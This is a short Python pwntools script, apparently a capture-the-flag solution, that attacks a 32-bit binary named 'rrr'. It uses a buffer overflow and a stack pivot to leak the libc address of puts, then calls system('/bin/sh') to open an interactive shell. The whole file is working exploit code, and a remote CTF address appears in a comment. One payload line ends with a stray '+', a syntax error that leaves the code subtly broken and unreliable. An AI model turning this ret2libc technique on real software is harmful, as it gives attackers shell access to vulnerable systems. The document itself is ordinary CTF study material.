#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
context(os='linux',arch='i386',log_level='debug')
# n = remote('101.71.29.5',10013)
# libc = ELF('./libc-2.23.so')
n = process('./rrr')
elf = ELF('./rrr')
libc = elf.libc
leave_ret = 0x080484e8
pop_ret = 0x080483c9
buf = elf.bss()+0x300
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = 'a'*0x30+p32(buf+0x100)
payload += p32(read_plt)+p32(leave_ret)
payload += p32(0)+p32(buf+0x100)+p32(100)

n.recvuntil('>\n')
n.send(payload)

payload  = p32(buf)+p32(puts_plt)+p32(pop_ret)+p32(puts_got)+
payload += p32(read_plt)+p32(leave_ret)
payload += p32(0)+p32(buf)+p32(100)
n.send(payload)
# sleep(0.1)
leak = u32(n.recv(4))
libc_base = leak-0x5fca0
print "leak:",hex(leak)
print "libc_base:",hex(libc_base)
# gdb.attach(n)
# system_addr = leak-0x24800
system_addr = libc_base + libc.symbols['system']
# sh_addr = leak+	0xf9eeb
sh_addr = libc_base + libc.search('/bin/sh').next()
print "system_addr:",hex(system_addr)
print "sh_addr:",hex(sh_addr)
payload = p32(0xdeadbeef)+p32(system_addr)+p32(0xdeadbeef)+p32(sh_addr)
n.send(payload)
# gdb.attach(n)

n.interactive()
